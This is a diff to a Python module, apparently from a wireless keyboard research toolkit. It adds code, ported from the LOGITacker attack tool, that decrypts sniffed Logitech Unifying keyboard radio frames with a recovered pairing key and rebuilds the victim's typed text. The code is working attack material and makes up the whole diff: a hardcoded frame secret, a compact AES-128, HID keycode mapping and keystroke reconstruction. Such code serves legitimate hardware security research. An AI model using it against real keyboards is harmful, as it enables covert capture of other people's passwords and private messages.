@@ -368,3 +368,195 @@ def unifying_pairing_key(payloads):
         "device_name": name.decode("latin1", "replace") if name else "",
         "full_pairing": {"req1", "req2", "req3", "rsp1", "rsp2", "rsp_final"} <= p.seen,
     }
+
+
+# --- Unifying encrypted-keyboard decryption (step after key recovery) -------
+#
+# Ported from LOGITacker (logitacker_unifying_crypto.c). An encrypted keyboard
+# RF frame is 22 bytes with (data[1] & 0x1f) == 0x13. The per-frame key is
+# AES-128-ECB(device_key, secret) where `secret` is a fixed 16-byte block with
+# the frame's 4-byte counter spliced in at offset 7; the 8 ciphertext bytes
+# (data[2..9]) are XORed with the first 8 key bytes to recover the HID report.
+#
+# AES-128 here is a compact, self-contained block-encrypt (no third-party dep).
+# It is for OFFLINE analysis of captured frames only -- not constant-time, not
+# for live/production crypto. Verified against the FIPS-197 known-answer test.
+
+_LITTLE_KNOWN_SECRET = bytes([0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d,
+                              0xde, 0xad, 0xbe, 0xef,          # overwritten by counter[0:4]
+                              0x0a, 0x0d, 0x13, 0x26, 0x0e])
+
+
+def _gf_mul(a, b):
+    r = 0
+    for _ in range(8):
+        if b & 1:
+            r ^= a
+        hi = a & 0x80
+        a = (a << 1) & 0xFF
+        if hi:
+            a ^= 0x1b
+        b >>= 1
+    return r
+
+
+def _build_aes_sbox():
+    inv = [0] * 256
+    for a in range(1, 256):
+        for b in range(1, 256):
+            if _gf_mul(a, b) == 1:
+                inv[a] = b
+                break
+    sbox = [0] * 256
+    for a in range(256):
+        x = inv[a]
+        s = x
+        for _ in range(4):
+            x = ((x << 1) | (x >> 7)) & 0xFF
+            s ^= x
+        sbox[a] = s ^ 0x63
+    return sbox
+
+
+_AES_SBOX = _build_aes_sbox()
+_AES_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
+
+
+def _aes128_key_schedule(key: bytes):
+    w = [list(key[i:i + 4]) for i in range(0, 16, 4)]   # 4 words
+    for i in range(4, 44):
+        t = list(w[i - 1])
+        if i % 4 == 0:
+            t = t[1:] + t[:1]                            # RotWord
+            t = [_AES_SBOX[b] for b in t]               # SubWord
+            t[0] ^= _AES_RCON[i // 4 - 1]
+        w.append([w[i - 4][j] ^ t[j] for j in range(4)])
+    return [sum((w[r * 4 + c] for c in range(4)), []) for r in range(11)]  # 11 round keys, 16B each
+
+
+def _aes128_encrypt_block(key: bytes, block: bytes) -> bytes:
+    rk = _aes128_key_schedule(key)
+    s = [block[i] ^ rk[0][i] for i in range(16)]
+    for rnd in range(1, 11):
+        s = [_AES_SBOX[b] for b in s]                   # SubBytes
+        # ShiftRows (state is column-major: byte index = col*4 + row)
+        s = [s[(i + (i % 4) * 4) % 16] for i in range(16)]
+        if rnd != 10:                                   # MixColumns
+            ns = [0] * 16
+            for c in range(4):
+                col = s[c * 4:c * 4 + 4]
+                ns[c * 4 + 0] = _gf_mul(col[0], 2) ^ _gf_mul(col[1], 3) ^ col[2] ^ col[3]
+                ns[c * 4 + 1] = col[0] ^ _gf_mul(col[1], 2) ^ _gf_mul(col[2], 3) ^ col[3]
+                ns[c * 4 + 2] = col[0] ^ col[1] ^ _gf_mul(col[2], 2) ^ _gf_mul(col[3], 3)
+                ns[c * 4 + 3] = _gf_mul(col[0], 3) ^ col[1] ^ col[2] ^ _gf_mul(col[3], 2)
+            s = ns
+        s = [s[i] ^ rk[rnd][i] for i in range(16)]      # AddRoundKey
+    return bytes(s)
+
+
+def unifying_frame_key(device_key: bytes, counter: bytes) -> bytes:
+    """Per-frame AES key = AES-ECB(device_key, secret) with the 4-byte counter
+    spliced into the fixed secret at offset 7."""
+    secret = bytearray(_LITTLE_KNOWN_SECRET)
+    secret[7:11] = bytes(counter[:4])
+    return _aes128_encrypt_block(bytes(device_key), bytes(secret))
+
+
+def esb_decrypt_keyboard_frame(device_key: bytes, payload: bytes):
+    """Decrypt a 22-byte encrypted-keyboard ESB payload with the recovered
+    device key. Returns the 8-byte HID keyboard report, or None if `payload`
+    isn't an encrypted keyboard frame."""
+    if len(payload) != 22 or (payload[1] & 0x1f) != 0x13:
+        return None
+    counter = bytes(payload[10:14])
+    fk = unifying_frame_key(device_key, counter)
+    return bytes(payload[2 + i] ^ fk[i] for i in range(8))
+
+
+# --- HID keyboard report -> text (US layout) --------------------------------
+#
+# USB HID usage IDs (HID Usage Tables, keyboard page, table 12), as enumerated
+# in LOGITacker's logitacker_keyboard_map.h. This is a US (ANSI) layout: other
+# layouts (e.g. DK) remap the symbol/102nd keys and would need their own table.
+# A decrypted keyboard report is 8 bytes: [modifiers][reserved][keycode x6].
+
+def _build_hid_us():
+    m = {}
+    for i in range(26):                       # 0x04..0x1d  a-z
+        m[0x04 + i] = (chr(ord('a') + i), chr(ord('A') + i))
+    digits = "1234567890"
+    shifted = "!@#$%^&*()"
+    for i in range(10):                       # 0x1e..0x27  1-0
+        m[0x1e + i] = (digits[i], shifted[i])
+    m.update({
+        0x2d: ("-", "_"), 0x2e: ("=", "+"), 0x2f: ("[", "{"), 0x30: ("]", "}"),
+        0x31: ("\\", "|"), 0x32: ("#", "~"), 0x33: (";", ":"), 0x34: ("'", '"'),
+        0x35: ("`", "~"), 0x36: (",", "<"), 0x37: (".", ">"), 0x38: ("/", "?"),
+        0x64: ("<", ">"),                     # ISO 102nd key
+        0x28: ("\n", "\n"), 0x2b: ("\t", "\t"), 0x2c: (" ", " "),
+        0x54: ("/", "/"), 0x55: ("*", "*"), 0x56: ("-", "-"), 0x57: ("+", "+"),
+        0x58: ("\n", "\n"), 0x63: (".", "."),
+    })
+    for i in range(10):                       # keypad 1-9,0  0x59..0x62
+        m[0x59 + i] = (str((i + 1) % 10), str((i + 1) % 10))
+    named = {
+        0x29: "esc", 0x2a: "bs", 0x39: "caps", 0x46: "prtsc", 0x47: "scroll",
+        0x48: "pause", 0x49: "ins", 0x4a: "home", 0x4b: "pgup", 0x4c: "del",
+        0x4d: "end", 0x4e: "pgdn", 0x4f: "right", 0x50: "left", 0x51: "down",
+        0x52: "up", 0x53: "num", 0x65: "menu",
+    }
+    for i in range(12):
+        named[0x3a + i] = f"f{i + 1}"
+    for k, v in named.items():
+        m[k] = f"<{v}>"
+    return m
+
+
+_HID_US = _build_hid_us()
+# modifier bits (HID): L/R Ctrl 0x01/0x10, Shift 0x02/0x20, Alt 0x04/0x40, Gui 0x08/0x80
+_MOD_SHIFT = 0x22
+_MOD_CTRL = 0x11
+_MOD_ALT = 0x44
+_MOD_GUI = 0x88
+
+
+def _render_key(code: int, mod: int) -> str:
+    v = _HID_US.get(code)
+    if v is None:
+        return f"<0x{code:02x}>"
+    if not isinstance(v, tuple):
+        return v                              # named key (e.g. <esc>), shift N/A
+    ch = v[1] if (mod & _MOD_SHIFT) else v[0]
+    combo = ("ctrl+" if (mod & _MOD_CTRL) else "") + \
+            ("alt+" if (mod & _MOD_ALT) else "") + \
+            ("gui+" if (mod & _MOD_GUI) else "")
+    if combo:
+        label = {"\n": "enter", "\t": "tab", " ": "space"}.get(ch, ch)
+        return f"<{combo}{label}>"
+    return ch
+
+
+def hid_report_to_keys(report: bytes, prev_keys=None):
+    """Keys newly pressed in this 8-byte HID report versus prev_keys (the raw
+    keycode set from the previous report), as rendered text. Returns
+    (text, current_keys). A held key repeats across reports, so only the
+    down-transition is emitted -- that reconstructs what was actually typed."""
+    prev = prev_keys or set()
+    mod = report[0]
+    keys = [k for k in report[2:8] if k > 0x03]
+    cur = set(keys)
+    text = "".join(_render_key(k, mod) for k in keys if k not in prev)
+    return text, cur
+
+
+def esb_type_from_frames(device_key: bytes, payloads):
+    """Decrypt a sequence of encrypted-keyboard ESB payloads and reconstruct
+    the typed text (down-transitions only). Non-keyboard frames are skipped."""
+    out, prev = [], set()
+    for pl in payloads:
+        rep = esb_decrypt_keyboard_frame(device_key, bytes(pl))
+        if rep is None:
+            continue
+        text, prev = hid_report_to_keys(rep, prev)
+        out.append(text)
+    return "".join(out)
